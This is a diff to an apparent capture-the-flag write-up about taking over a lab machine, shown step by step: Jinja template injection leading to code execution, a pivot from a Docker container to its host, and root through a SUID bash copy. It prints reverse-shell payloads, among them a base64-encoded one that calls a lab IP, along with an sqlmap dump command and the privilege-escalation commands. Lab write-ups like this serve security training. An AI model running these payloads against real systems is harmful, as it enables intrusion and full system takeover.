@@ -53,16 +53,58 @@ sqlmap -r login_req.txt -D main -T user --dump --batch
 ```text
 {{7*7}}  --> Rendered as 49
 ```
+![ssti](/images/12.png)
 * **Remote Code Execution Payload:**
 ```python
 {{ namespace.__init__.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1'").read() }}
 ```
+```
+{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjAvNDQ0NCAwPiYx${IFS}|base64${IFS}-d|bash').read()}}
+```
+here to acheive reverse shell we encode the shell in bases64 but why ?
+--> This is because some characters have special meanings to shells or can cause problems when passing commands through templates and intermediate interpreters.
+for example: ```bash -i >& /dev/tcp/10.10.14.23/4444 0>&1```, in this symbols like >, /,spaces contain shell descriptors and can interact with the filters and parsing roles.
+
+![ssti_to_rce](/images/13.png)
+![ssti_to_rce_](/images/14.png)
+
+A directory list of user augustus home directory shows that instead of their name, the UID 1000
+is displayed as the owner for the available files and folders. This hints that the user's home
+directory is mounted inside the docker container from the main system. 
+
 * **Result:** Obtained an interactive shell as `root` inside the Docker container (`/.dockerenv` present).
 
+ Checking ```mount``` we see that the user directory from the host is indeed mounted with read/write flag enabled.
+ ![docker](/images/16.png)
 ---
 
 ## 4. Lateral Movement & Internal Network Pivoting
 * **Container Network Discovery:** Enumerated network interfaces (`ip a` / `ip route`) and discovered the Docker bridge gateway at `172.19.0.1` alongside a mounted host directory at `/home/augustus`.
+![lateral_movement_1](/images/17.png)
+![lateral_movement_2](/images/18.png)
+
+<b> So one question here, why to scan the docker bridge gateway instead of the container itself ?<b>
+The container might have limited access to the host's services, but the gateway address can expose services listening on the host-side bridge interface.
+
+For example, you might discover:
+- SSH (22)
+- HTTP (80)
+- Docker API (2375)
+- Other internal services
+and don't restrict to the container itself. The docker has its own network architecture.
+![docker_network](/images/images.png)
+
+Think in terms of three layers:
+| Layer | What to investigate |
+| :--- | :--- |
+| Current container	| Users, processes, files, capabilities |
+| Docker network	| Gateway , neighboring containers, reachable services |
+| Docker host	| Host services, mounted directories, container configuration |
+
+The key is that the Docker gateway and the Docker container are two different network endpoints. Scanning the gateway does not directly enumerate the container's ports. It enumerates services reachable at the gateway's IP address.
+
+We use bash to scan the gateway because nmap is not installed in the system.
+![lateral_movement_3](/images/19.png)
 * **Lateral Movement to Host:**
 ```bash
 # Verified SSH access on the Docker host gateway using password reuse
@@ -77,15 +119,18 @@ ssh augustus@172.19.0.1
 * **Exploitation Steps:**
 ```bash
 # On the host (as augustus): copy /bin/bash into the shared home directory
-cp /bin/bash /home/augustus/rootbash
+cp /bin/bash /home/augustus/bash
 
 # Inside the container (as container root): change ownership to root and set the SUID bit
-chown root:root /home/augustus/rootbash
-chmod 4755 /home/augustus/rootbash
-
-# On the host (as augustus): execute the SUID binary with -p to preserve root privileges
-/home/augustus/rootbash -p
+chown root:root /home/augustus/bash
+chmod 4755 /home/augustus/bash
 ```
+![priv_esc](/images/20.png)
+```
+# On the host (as augustus): execute the SUID binary with -p to preserve root privileges
+/home/augustus/bash -p
+```
+![priv_esc](images/21.png)
 * **Result:** Escalated to `root` (`euid=0`) on the underlying host OS and retrieved `root.txt`.
 
 ---
